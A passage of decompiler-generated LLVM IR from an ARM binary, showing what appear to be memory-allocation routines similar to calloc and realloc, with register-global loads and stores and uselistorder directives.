  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 20, 19, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 47, 42, 43, 44, 45, 46, 48, 49, 50, 51, 52, 53, 54, 55 }
  uselistorder i32* %r0.global-to-local, { 5, 3, 30, 4, 6, 7, 8, 22, 12, 9, 23, 10, 11, 14, 13, 19, 15, 24, 18, 17, 25, 20, 21, 27, 26, 28, 16, 29, 31, 36, 32, 33, 2, 34, 35, 37, 38, 39, 42, 43, 40, 41, 48, 45, 44, 46, 47, 49, 1, 50, 51, 52, 53, 0, 54, 57, 56, 55 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 2, 3, 4, 7, 5, 6, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %ip.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 12, 11, 13, 10, 14, 15, 16, 17, 18, 19, 20, 21, 22, 0, 23, 24, 36, 35, 28, 25, 1, 26, 27, 29, 30, 31, 32, 33, 34, 37, 38, 39, 40, 41, 42 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @function_13b24, { 1, 0 }
  uselistorder i32 (i32)* @function_117c4, { 1, 0 }
  uselistorder label %dec_label_pc_12130, { 1, 0 }
  uselistorder label %dec_label_pc_12114, { 7, 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_12110, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_12100, { 1, 2, 0 }
  uselistorder label %bb168, { 1, 0 }
  uselistorder label %bb166, { 1, 0 }
  uselistorder label %dec_label_pc_12094, { 4, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_12010, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_12008, { 1, 0 }
  uselistorder label %bb164, { 1, 0 }
  uselistorder label %.thread44, { 1, 0 }
  uselistorder label %.thread43, { 1, 0 }
  uselistorder label %.thread40, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_11edc, { 1, 0 }
  uselistorder label %.thread32, { 1, 0 }
  uselistorder label %bb157, { 1, 0 }
  uselistorder label %bb153, { 1, 0 }
  uselistorder label %dec_label_pc_11e10, { 2, 0, 3, 1 }
  uselistorder label %bb150, { 1, 0 }
  uselistorder label %bb148, { 1, 0 }
  uselistorder label %.thread27, { 1, 0 }
  uselistorder label %dec_label_pc_11cc8, { 0, 2, 1 }
  uselistorder label %.thread121, { 1, 0 }
  uselistorder label %bb144, { 1, 0 }
  uselistorder label %dec_label_pc_11c1c, { 1, 0 }
  uselistorder label %dec_label_pc_11c24.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_11be8, { 1, 0 }
  uselistorder label %dec_label_pc_11b9c, { 1, 0 }
  uselistorder label %dec_label_pc_11b30, { 1, 0 }
  uselistorder label %dec_label_pc_11b2c, { 1, 0 }
  uselistorder label %dec_label_pc_11ad8, { 1, 0 }
  uselistorder label %dec_label_pc_11ac4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11a8c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_11a78, { 1, 0 }
  uselistorder label %bb140, { 1, 0 }
  uselistorder label %bb138, { 1, 0 }
}

define i32 @function_12144(i32 %arg1) local_unnamed_addr {
dec_label_pc_12144:
  %v0_12144 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12144, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_12144
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_12144, %bb
  %v10_12158 = phi i32 [ %arg1, %dec_label_pc_12144 ], [ 0, %bb ]
  ret i32 %v10_12158

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @function_1215c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1215c:
  %ip.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %v3_1215c = load i32, i32* @r4, align 4
  %v6_1215c = load i32, i32* @r5, align 4
  %v9_1215c = load i32, i32* @r6, align 4
  %v12_1215c = load i32, i32* @lr, align 4
  %v2_12164 = icmp eq i32 %arg1, 0
  store i32 add (i32 ptrtoint (i32* @global_var_c624.380 to i32), i32 74096), i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %v2_12174 = mul i32 %arg2, %arg1
  store i32 %v2_12174, i32* @r6, align 4
  br i1 %v2_12164, label %dec_label_pc_121a4, label %dec_label_pc_1217c

dec_label_pc_1217c:                               ; preds = %dec_label_pc_1215c
  store i32 %arg1, i32* @r1, align 4
  store i32 %v2_12174, i32* @r0, align 4
  %v0_12184 = call i32 @function_10878()
  %v0_12188 = load i32, i32* @r4, align 4
  %v9_12188 = icmp eq i32 %v0_12188, %v0_12184
  br i1 %v9_12188, label %dec_label_pc_1217c.dec_label_pc_121a4_crit_edge, label %dec_label_pc_12190

dec_label_pc_1217c.dec_label_pc_121a4_crit_edge:  ; preds = %dec_label_pc_1217c
  %v0_121a8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_121a4

dec_label_pc_12190:                               ; preds = %dec_label_pc_1217c
  %v0_12190 = call i32 @function_11204()
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_1219c = inttoptr i32 %v0_12190 to i32*
  store i32 12, i32* %v2_1219c, align 4
  br label %dec_label_pc_12268

dec_label_pc_121a4:                               ; preds = %dec_label_pc_1217c.dec_label_pc_121a4_crit_edge, %dec_label_pc_1215c
  %v0_121c0 = phi i32 [ %v0_121a8.pre, %dec_label_pc_1217c.dec_label_pc_121a4_crit_edge ], [ add (i32 ptrtoint (i32* @global_var_c624.380 to i32), i32 74096), %dec_label_pc_1215c ]
  %v2_121a8 = add i32 %v0_121c0, 68
  %v3_121a8 = inttoptr i32 %v2_121a8 to i32*
  %v4_121a8 = load i32, i32* %v3_121a8, align 4
  store i32 %v4_121a8, i32* @r4, align 4
  %v2_121c0 = add i32 %v0_121c0, 72
  %v3_121c0 = inttoptr i32 %v2_121c0 to i32*
  %v4_121c0 = load i32, i32* %v3_121c0, align 4
  store i32 %v4_121c0, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_121c0)
  %v0_121d4 = load i32, i32* @r5, align 4
  %v2_121d4 = add i32 %v0_121d4, 16
  %v3_121d4 = inttoptr i32 %v2_121d4 to i32*
  %v4_121d4 = load i32, i32* %v3_121d4, align 4
  store i32 %v4_121d4, i32* %ip.global-to-local, align 4
  store i32 74208, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_121d4)
  %v0_121e0 = load i32, i32* @r6, align 4
  store i32 %v0_121e0, i32* @r0, align 4
  %v0_121e4 = call i32 @function_1183c()
  store i32 %v0_121e4, i32* %r4.global-to-local, align 4
  %v2_121e8 = icmp eq i32 %v0_121e4, 0
  br i1 %v2_121e8, label %.thread, label %dec_label_pc_121f0

dec_label_pc_121f0:                               ; preds = %dec_label_pc_121a4
  %v1_121f0 = add i32 %v0_121e4, -4
  %v2_121f0 = inttoptr i32 %v1_121f0 to i32*
  %v3_121f0 = load i32, i32* %v2_121f0, align 4
  %v1_121f4 = and i32 %v3_121f0, 2
  %v2_121f4 = icmp eq i32 %v1_121f4, 0
  br i1 %v2_121f4, label %dec_label_pc_121fc, label %.thread

dec_label_pc_121fc:                               ; preds = %dec_label_pc_121f0
  %v1_121fc7 = add i32 %v3_121f0, -4
  %v1_12200 = and i32 %v1_121fc7, -4
  store i32 %v1_12200, i32* @r2, align 4
  %v3_12204 = udiv i32 %v1_12200, 4
  store i32 %v3_12204, i32* %ip.global-to-local, align 4
  %tmp = icmp eq i32 %v1_12200, 36
  %v2_1220c = icmp ult i32 %v1_12200, 33
  %v3_1220c = or i1 %tmp, %v2_1220c
  br i1 %v3_1220c, label %dec_label_pc_12218, label %dec_label_pc_12210

dec_label_pc_12210:                               ; preds = %dec_label_pc_121fc
  %v2_12210 = inttoptr i32 %v0_121e4 to i8*
  %v3_12210 = call i32 @function_11260(i8* %v2_12210, i32 0)
  br label %.thread

dec_label_pc_12218:                               ; preds = %dec_label_pc_121fc
  %tmp8 = icmp eq i32 %v1_12200, 16
  %v2_1221c = inttoptr i32 %v0_121e4 to i32*
  store i32 0, i32* %v2_1221c, align 4
  %v1_12220 = load i32, i32* %r4.global-to-local, align 4
  %v2_12220 = add i32 %v1_12220, 4
  %v3_12220 = inttoptr i32 %v2_12220 to i32*
  store i32 0, i32* %v3_12220, align 4
  %v1_12224 = load i32, i32* %r4.global-to-local, align 4
  %v2_12224 = add i32 %v1_12224, 8
  %v3_12224 = inttoptr i32 %v2_12224 to i32*
  store i32 0, i32* %v3_12224, align 4
  %v2_12228 = icmp ult i32 %v1_12200, 13
  %v3_12228 = or i1 %tmp8, %v2_12228
  br i1 %v3_12228, label %.thread, label %dec_label_pc_1222c

dec_label_pc_1222c:                               ; preds = %dec_label_pc_12218
  %v0_1222c = load i32, i32* %ip.global-to-local, align 4
  %v1_12230 = load i32, i32* %r4.global-to-local, align 4
  %v2_12230 = add i32 %v1_12230, 12
  %v3_12230 = inttoptr i32 %v2_12230 to i32*
  store i32 0, i32* %v3_12230, align 4
  %v1_12234 = load i32, i32* %r4.global-to-local, align 4
  %v2_12234 = add i32 %v1_12234, 16
  %v3_12234 = inttoptr i32 %v2_12234 to i32*
  store i32 0, i32* %v3_12234, align 4
  %tmp9 = icmp ult i32 %v0_1222c, 7
  br i1 %tmp9, label %.thread, label %dec_label_pc_1223c

dec_label_pc_1223c:                               ; preds = %dec_label_pc_1222c
  %v0_1223c = load i32, i32* %ip.global-to-local, align 4
  %v7_1223c = icmp eq i32 %v0_1223c, 9
  %v1_12240 = load i32, i32* %r4.global-to-local, align 4
  %v2_12240 = add i32 %v1_12240, 20
  %v3_12240 = inttoptr i32 %v2_12240 to i32*
  store i32 0, i32* %v3_12240, align 4
  %v1_12244 = load i32, i32* %r4.global-to-local, align 4
  %v2_12244 = add i32 %v1_12244, 24
  %v3_12244 = inttoptr i32 %v2_12244 to i32*
  store i32 0, i32* %v3_12244, align 4
  br i1 %v7_1223c, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1223c
  %v2_12248 = load i32, i32* %r4.global-to-local, align 4
  %v3_12248 = add i32 %v2_12248, 32
  %v4_12248 = inttoptr i32 %v3_12248 to i32*
  store i32 0, i32* %v4_12248, align 4
  %v2_1224c = load i32, i32* %r4.global-to-local, align 4
  %v3_1224c = add i32 %v2_1224c, 28
  %v4_1224c = inttoptr i32 %v3_1224c to i32*
  store i32 0, i32* %v4_1224c, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_1223c, %dec_label_pc_121f0, %dec_label_pc_1222c, %dec_label_pc_12218, %dec_label_pc_121a4, %dec_label_pc_12210, %bb
  %v0_1225c = load i32, i32* @r5, align 4
  %v2_1225c = add i32 %v0_1225c, 24
  %v3_1225c = inttoptr i32 %v2_1225c to i32*
  %v4_1225c = load i32, i32* %v3_1225c, align 4
  store i32 %v4_1225c, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_1225c)
  br label %dec_label_pc_12268

dec_label_pc_12268:                               ; preds = %dec_label_pc_12190, %.thread
  %v0_12268 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v3_1215c, i32* @r4, align 4
  store i32 %v6_1215c, i32* @r5, align 4
  store i32 %v9_1215c, i32* @r6, align 4
  store i32 %v12_1215c, i32* @lr, align 4
  ret i32 %v0_12268

; uselistorder directives
  uselistorder i32 %v1_12200, { 0, 5, 1, 4, 3, 2 }
  uselistorder i32 %v0_121e4, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r4.global-to-local, { 9, 0, 1, 2, 3, 4, 5, 6, 7, 8, 10 }
  uselistorder i32 33, { 0, 8, 1, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12268, { 1, 0 }
  uselistorder label %.thread, { 6, 0, 2, 3, 5, 1, 4 }
}

define i32 @function_1227c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1227c:
  %v0_1227c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1227c, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_1227c
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_1227c, %bb
  %v10_1228c = phi i32 [ %arg1, %dec_label_pc_1227c ], [ 0, %bb ]
  ret i32 %v10_1228c

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @function_12290(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_12290:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_12290 = load i32, i32* @r4, align 4
  %v6_12290 = load i32, i32* @r5, align 4
  %v9_12290 = load i32, i32* @r6, align 4
  %v12_12290 = load i32, i32* @r7, align 4
  %v15_12290 = load i32, i32* @r8, align 4
  %v18_12290 = load i32, i32* @sb, align 4
  %v21_12290 = load i32, i32* @sl, align 4
  %v24_12290 = load i32, i32* @fp, align 4
  %v27_12290 = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_1229c = icmp eq i32* %arg1, null
  store i32 add (i32 ptrtoint (i32* @global_var_c4ec.387 to i32), i32 74408), i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_1229c, label %dec_label_pc_122b0, label %dec_label_pc_122c0

dec_label_pc_122b0:                               ; preds = %dec_label_pc_12290
  store i32 %arg2, i32* @r0, align 4
  %v0_122b4 = call i32 @function_1183c()
  store i32 %v0_122b4, i32* %r0.global-to-local, align 4
  store i32 %v0_122b4, i32* @r4, align 4
  br label %dec_label_pc_12618

dec_label_pc_122c0:                               ; preds = %dec_label_pc_12290
  %v2_122c0 = icmp eq i32 %arg2, 0
  br i1 %v2_122c0, label %dec_label_pc_122c8, label %dec_label_pc_122d4

dec_label_pc_122c8:                               ; preds = %dec_label_pc_122c0
  %v0_122c8 = call i32 @function_128a8()
  store i32 %v0_122c8, i32* %r0.global-to-local, align 4
  %v0_122cc = load i32, i32* @r6, align 4
  store i32 %v0_122cc, i32* @r4, align 4
  br label %dec_label_pc_12618

dec_label_pc_122d4:                               ; preds = %dec_label_pc_122c0
  store i32 68, i32* %r3.global-to-local, align 4
  %v4_122dc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_c4ec.387 to i32), i32 74476) to i32*), align 4
  store i32 %v4_122dc, i32* @r4, align 4
  store i32 36, i32* %r3.global-to-local, align 4
  store i32 %v4_122dc, i32* %r2.global-to-local, align 4
  %v4_122e8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_c4ec.387 to i32), i32 74444) to i32*), align 4
  store i32 %v4_122e8, i32* %r1.global-to-local, align 4
  %v2_122ec = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_122ec, i32* %r0.global-to-local, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  %v4_122f4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_c4ec.387 to i32), i32 74480) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_122f4)
  %v0_12300 = load i32, i32* @r4, align 4
  store i32 %v0_12300, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_c4ec.387 to i32), i32 74408), i32* %r1.global-to-local, align 4
  %v4_1230c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_c4ec.387 to i32), i32 74424) to i32*), align 4
  store i32 %v4_1230c, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_12318.392 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_1230c)
  %v0_12318 = load i32, i32* @r6, align 4
  %tmp36 = icmp ult i32 %v0_12318, -32
  br i1 %tmp36, label %dec_label_pc_12334, label %dec_label_pc_12320

dec_label_pc_12320:                               ; preds = %dec_label_pc_122d4
  %v0_12320 = call i32 @function_11204()
  store i32 %v0_12320, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_1232c = inttoptr i32 %v0_12320 to i32*
  store i32 12, i32* %v2_1232c, align 4
  br label %dec_label_pc_12618

dec_label_pc_12334:                               ; preds = %dec_label_pc_122d4
  %v1_12334 = add i32 %v0_12318, 11
  store i32 %v1_12334, i32* %r0.global-to-local, align 4
  %v0_12338 = load i32, i32* @r5, align 4
  %v1_12338 = add i32 %v0_12338, -4
  %v2_12338 = inttoptr i32 %v1_12338 to i32*
  %v3_12338 = load i32, i32* %v2_12338, align 4
  store i32 %v3_12338, i32* %r2.global-to-local, align 4
  %v2_1233c = icmp ugt i32 %v1_12334, 14
  %v7_1233c = icmp eq i32 %v1_12334, 15
  %v2_12340 = xor i1 %v2_1233c, true
  %v3_12340 = or i1 %v7_1233c, %v2_12340
  br i1 %v3_12340, label %bb, label %bb27

bb:                                               ; preds = %dec_label_pc_12334
  store i32 16, i32* @sb, align 4
  br label %bb27

bb27:                                             ; preds = %dec_label_pc_12334, %bb
  %v2_12344 = xor i1 %v7_1233c, true
  %v3_12344 = and i1 %v2_1233c, %v2_12344
  br i1 %v3_12344, label %bb28, label %bb29

bb28:                                             ; preds = %bb27
  %v5_12344 = and i32 %v1_12334, -8
  store i32 %v5_12344, i32* @sb, align 4
  br label %bb29

bb29:                                             ; preds = %bb27, %bb28
  %v1_12348 = and i32 %v3_12338, 2
  %v2_12348 = icmp eq i32 %v1_12348, 0
  %v1_1234c = add i32 %v0_12338, -8
  store i32 %v1_1234c, i32* @sl, align 4
  %v1_12350 = and i32 %v3_12338, -4
  store i32 %v1_12350, i32* @r6, align 4
  br i1 %v2_12348, label %dec_label_pc_12358, label %dec_label_pc_12530

dec_label_pc_12358:                               ; preds = %bb29
  %v1_12358 = load i32, i32* @sb, align 4
  %v3_12358 = icmp ult i32 %v1_12350, %v1_12358
  br i1 %v3_12358, label %dec_label_pc_12364, label %bb30

bb30:                                             ; preds = %dec_label_pc_12358
  store i32 %v1_12350, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_124c8

dec_label_pc_12364:                               ; preds = %dec_label_pc_12358
  store i32 32, i32* %r3.global-to-local, align 4
  %v4_1236c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_c4ec.387 to i32), i32 74440) to i32*), align 4
  store i32 %v4_1236c, i32* %r0.global-to-local, align 4
  %v1_12370 = add i32 %v4_1236c, 44
  %v2_12370 = inttoptr i32 %v1_12370 to i32*
  %v3_12370 = load i32, i32* %v2_12370, align 4
  store i32 %v3_12370, i32* %r3.global-to-local, align 4
  %v2_12374 = add i32 %v1_12350, %v1_1234c
  store i32 %v2_12374, i32* @r4, align 4
  %v9_12378 = icmp eq i32 %v2_12374, %v3_12370
  %v1_1237c = add i32 %v2_12374, 4
  %v2_1237c = inttoptr i32 %v1_1237c to i32*
  %v3_1237c = load i32, i32* %v2_1237c, align 4
  store i32 %v3_1237c, i32* %r1.global-to-local, align 4
  br i1 %v9_12378, label %dec_label_pc_12384, label %dec_label_pc_123c0

dec_label_pc_12384:                               ; preds = %dec_label_pc_12364
  %v1_12384 = and i32 %v3_1237c, -4
  %v2_12388 = add i32 %v1_12384, %v1_12350
  store i32 %v2_12388, i32* %r1.global-to-local, align 4
  %v1_1238c = add i32 %v1_12358, 16
  store i32 %v1_1238c, i32* %r3.global-to-local, align 4
  %v3_12390 = icmp ult i32 %v2_12388, %v1_1238c
  br i1 %v3_12390, label %dec_label_pc_12414, label %dec_label_pc_12398

dec_label_pc_12398:                               ; preds = %dec_label_pc_12384
  %v2_12398 = sub i32 %v2_12388, %v1_12358
  %v1_1239c = urem i32 %v3_12338, 2
  %v2_123a0 = add i32 %v1_12358, %v1_1234c
  store i32 %v2_123a0, i32* %r1.global-to-local, align 4
  %v2_123a4 = or i32 %v1_12358, %v1_1239c
  store i32 %v2_123a4, i32* %r2.global-to-local, align 4
  %v1_123a8 = or i32 %v2_12398, 1
  store i32 %v1_123a8, i32* %r3.global-to-local, align 4
  store i32 %v0_12338, i32* @r4, align 4
  store i32 %v2_123a4, i32* %v2_12338, align 4
  %v0_123b4 = load i32, i32* %r1.global-to-local, align 4
  %v1_123b4 = load i32, i32* %r0.global-to-local, align 4
  %v2_123b4 = add i32 %v1_123b4, 44
  %v3_123b4 = inttoptr i32 %v2_123b4 to i32*
  store i32 %v0_123b4, i32* %v3_123b4, align 4
  %v0_123b8 = load i32, i32* %r3.global-to-local, align 4
  %v1_123b8 = load i32, i32* %r1.global-to-local, align 4
  %v2_123b8 = add i32 %v1_123b8, 4
  %v3_123b8 = inttoptr i32 %v2_123b8 to i32*
  store i32 %v0_123b8, i32* %v3_123b8, align 4
  br label %dec_label_pc_125fc

dec_label_pc_123c0:                               ; preds = %dec_label_pc_12364
  %v1_123c0 = and i32 %v3_1237c, -2
  %v2_123c4 = add i32 %v1_123c0, %v2_12374
  store i32 %v2_123c4, i32* %r3.global-to-local, align 4
  %v1_123c8 = add i32 %v2_123c4, 4
  %v2_123c8 = inttoptr i32 %v1_123c8 to i32*
  %v3_123c8 = load i32, i32* %v2_123c8, align 4
  store i32 %v3_123c8, i32* %r3.global-to-local, align 4
  %v1_123cc = urem i32 %v3_123c8, 2
  %v2_123cc = icmp eq i32 %v1_123cc, 0
  br i1 %v2_123cc, label %dec_label_pc_123d4, label %dec_label_pc_12414

dec_label_pc_123d4:                               ; preds = %dec_label_pc_123c0
  %v1_123d4 = and i32 %v3_1237c, -4
  store i32 %v1_123d4, i32* %r3.global-to-local, align 4
  %v2_123d8 = add i32 %v1_123d4, %v1_12350
  store i32 %v2_123d8, i32* %r0.global-to-local, align 4
  %v3_123dc = icmp ult i32 %v2_123d8, %v1_12358
  br i1 %v3_123dc, label %dec_label_pc_12414, label %dec_label_pc_123e4

dec_label_pc_123e4:                               ; preds = %dec_label_pc_123d4
  %v1_123e4 = add i32 %v1_12350, %v0_12338
  %v2_123e4 = inttoptr i32 %v1_123e4 to i32*
  %v3_123e4 = load i32, i32* %v2_123e4, align 4
  store i32 %v3_123e4, i32* %r1.global-to-local, align 4
  %v1_123e8 = add i32 %v3_123e4, 12
  %v2_123e8 = inttoptr i32 %v1_123e8 to i32*
  %v3_123e8 = load i32, i32* %v2_123e8, align 4
  store i32 %v3_123e8, i32* %r3.global-to-local, align 4
  %v9_123ec = icmp eq i32 %v3_123e8, %v2_12374
  %v1_123f0 = add i32 %v2_12374, 12
  %v2_123f0 = inttoptr i32 %v1_123f0 to i32*
  %v3_123f0 = load i32, i32* %v2_123f0, align 4
  store i32 %v3_123f0, i32* %r2.global-to-local, align 4
  br i1 %v9_123ec, label %dec_label_pc_123f8, label %dec_label_pc_12404

dec_label_pc_123f8:                               ; preds = %dec_label_pc_123e4
  %v1_123f8 = add i32 %v3_123f0, 8
  %v2_123f8 = inttoptr i32 %v1_123f8 to i32*
  %v3_123f8 = load i32, i32* %v2_123f8, align 4
  store i32 %v3_123f8, i32* %r3.global-to-local, align 4
  %v9_123fc = icmp eq i32 %v3_123f8, %v2_12374
  br i1 %v9_123fc, label %dec_label_pc_12408, label %dec_label_pc_12404

dec_label_pc_12404:                               ; preds = %dec_label_pc_123e4, %dec_label_pc_123f8
  %v0_12404 = call i32 @function_12b24()
  store i32 %v0_12404, i32* %r0.global-to-local, align 4
  %v0_12408.pre = load i32, i32* @r1, align 4
  %v1_12408.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_12408

dec_label_pc_12408:                               ; preds = %dec_label_pc_123f8, %dec_label_pc_12404
  %v1_12408 = phi i32 [ %v3_123f0, %dec_label_pc_123f8 ], [ %v1_12408.pre, %dec_label_pc_12404 ]
  %v0_12408 = phi i32 [ %v3_123e4, %dec_label_pc_123f8 ], [ %v0_12408.pre, %dec_label_pc_12404 ]
  %v2_12408 = add i32 %v1_12408, 8
  %v3_12408 = inttoptr i32 %v2_12408 to i32*
  store i32 %v0_12408, i32* %v3_12408, align 4
  %v0_1240c = load i32, i32* %r2.global-to-local, align 4
  %v1_1240c = load i32, i32* %r1.global-to-local, align 4
  %v2_1240c = add i32 %v1_1240c, 12
  %v3_1240c = inttoptr i32 %v2_1240c to i32*
  store i32 %v0_1240c, i32* %v3_1240c, align 4
  %v1_124c8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_124c8

dec_label_pc_12414:                               ; preds = %dec_label_pc_12384, %dec_label_pc_123d4, %dec_label_pc_123c0
  %v1_12414 = add i32 %v1_12358, -7
  store i32 %v1_12414, i32* @r0, align 4
  %v0_12418 = call i32 @function_1183c()
  store i32 %v0_12418, i32* @r0, align 4
  store i32 %v0_12418, i32* %r1.global-to-local, align 4
  %v2_1241c = icmp eq i32 %v0_12418, 0
  br i1 %v2_1241c, label %bb31, label %dec_label_pc_12428

bb31:                                             ; preds = %dec_label_pc_12414
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_125fc

dec_label_pc_12428:                               ; preds = %dec_label_pc_12414
  %v1_12430.pre = load i32, i32* @r4, align 4
  %v1_12428 = add i32 %v0_12418, -4
  %v2_12428 = inttoptr i32 %v1_12428 to i32*
  %v3_12428 = load i32, i32* %v2_12428, align 4
  store i32 %v3_12428, i32* @r3, align 4
  %v1_1242c = add i32 %v0_12418, -8
  store i32 %v1_1242c, i32* @r7, align 4
  %v9_12430 = icmp eq i32 %v1_1242c, %v1_12430.pre
  br i1 %v9_12430, label %.thread2, label %dec_label_pc_12440

.thread2:                                         ; preds = %dec_label_pc_12428
  %v2_12434 = and i32 %v3_12428, -4
  store i32 %v2_12434, i32* %r3.global-to-local, align 4
  %v2_12438 = load i32, i32* @r6, align 4
  %v3_12438 = add i32 %v2_12438, %v2_12434
  store i32 %v3_12438, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_124c8

dec_label_pc_12440:                               ; preds = %dec_label_pc_12428
  %v0_12440 = load i32, i32* @r6, align 4
  %v1_12440 = add i32 %v0_12440, -4
  store i32 %v1_12440, i32* @r2, align 4
  %v3_12444 = udiv i32 %v1_12440, 4
  store i32 %v3_12444, i32* @ip, align 4
  %tmp37 = and i32 %v1_12440, -4
  %tmp38 = icmp eq i32 %tmp37, 36
  %v2_1244c = icmp ult i32 %v1_12440, 36
  %v3_1244c = or i1 %tmp38, %v2_1244c
  %v0_1245c = load i32, i32* @r5, align 4
  br i1 %v3_1244c, label %dec_label_pc_1245c, label %dec_label_pc_12450

dec_label_pc_12450:                               ; preds = %dec_label_pc_12440
  store i32 %v0_1245c, i32* @r1, align 4
  %v0_12454 = call i32 @function_11310()
  store i32 %v0_12454, i32* %r0.global-to-local, align 4
  br label %.thread6

dec_label_pc_1245c:                               ; preds = %dec_label_pc_12440
  %v1_1245c = inttoptr i32 %v0_1245c to i32*
  %v2_1245c = load i32, i32* %v1_1245c, align 4
  store i32 %v2_1245c, i32* %r3.global-to-local, align 4
  %v2_12460 = inttoptr i32 %v0_12418 to i32*
  store i32 %v2_1245c, i32* %v2_12460, align 4
  %v0_12464 = load i32, i32* @r5, align 4
  %v1_12464 = add i32 %v0_12464, 4
  %v2_12464 = inttoptr i32 %v1_12464 to i32*
  %v3_12464 = load i32, i32* %v2_12464, align 4
  store i32 %v3_12464, i32* %r3.global-to-local, align 4
  %v1_12468 = load i32, i32* %r1.global-to-local, align 4
  %v2_12468 = add i32 %v1_12468, 4
  %v3_12468 = inttoptr i32 %v2_12468 to i32*
  store i32 %v3_12464, i32* %v3_12468, align 4
  %v0_1246c = load i32, i32* @r5, align 4
  %v1_1246c = add i32 %v0_1246c, 8
  %v2_1246c = inttoptr i32 %v1_1246c to i32*
  %v3_1246c = load i32, i32* %v2_1246c, align 4
  store i32 %v3_1246c, i32* %r3.global-to-local, align 4
  %v0_12470 = load i32, i32* @ip, align 4
  %v1_12474 = load i32, i32* %r1.global-to-local, align 4
  %v2_12474 = add i32 %v1_12474, 8
  %v3_12474 = inttoptr i32 %v2_12474 to i32*
  store i32 %v3_1246c, i32* %v3_12474, align 4
  %tmp39 = icmp ult i32 %v0_12470, 5
  br i1 %tmp39, label %.thread6, label %dec_label_pc_1247c

dec_label_pc_1247c:                               ; preds = %dec_label_pc_1245c
  %v0_1247c = load i32, i32* @r5, align 4
  %v1_1247c = add i32 %v0_1247c, 12
  %v2_1247c = inttoptr i32 %v1_1247c to i32*
  %v3_1247c = load i32, i32* %v2_1247c, align 4
  store i32 %v3_1247c, i32* %r3.global-to-local, align 4
  %v1_12480 = load i32, i32* %r1.global-to-local, align 4
  %v2_12480 = add i32 %v1_12480, 12
  %v3_12480 = inttoptr i32 %v2_12480 to i32*
  store i32 %v3_1247c, i32* %v3_12480, align 4
  %v0_12484 = load i32, i32* @r5, align 4
  %v1_12484 = add i32 %v0_12484, 16
  %v2_12484 = inttoptr i32 %v1_12484 to i32*
  %v3_12484 = load i32, i32* %v2_12484, align 4
  store i32 %v3_12484, i32* %r3.global-to-local, align 4
  %v0_12488 = load i32, i32* @ip, align 4
  %v1_1248c = load i32, i32* %r1.global-to-local, align 4
  %v2_1248c = add i32 %v1_1248c, 16
  %v3_1248c = inttoptr i32 %v2_1248c to i32*
  store i32 %v3_12484, i32* %v3_1248c, align 4
  %tmp40 = icmp ult i32 %v0_12488, 7
